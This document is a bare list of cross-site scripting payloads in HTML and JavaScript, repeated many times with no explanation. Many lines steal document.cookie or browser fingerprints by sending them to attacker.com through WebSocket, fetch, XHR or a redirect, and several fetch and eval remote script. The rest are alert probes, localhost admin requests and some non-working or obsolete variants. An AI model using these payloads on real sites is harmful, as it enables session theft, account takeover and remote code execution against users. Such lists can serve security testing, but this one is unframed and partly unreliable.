<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<svg onload="alert(1)"></svg>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
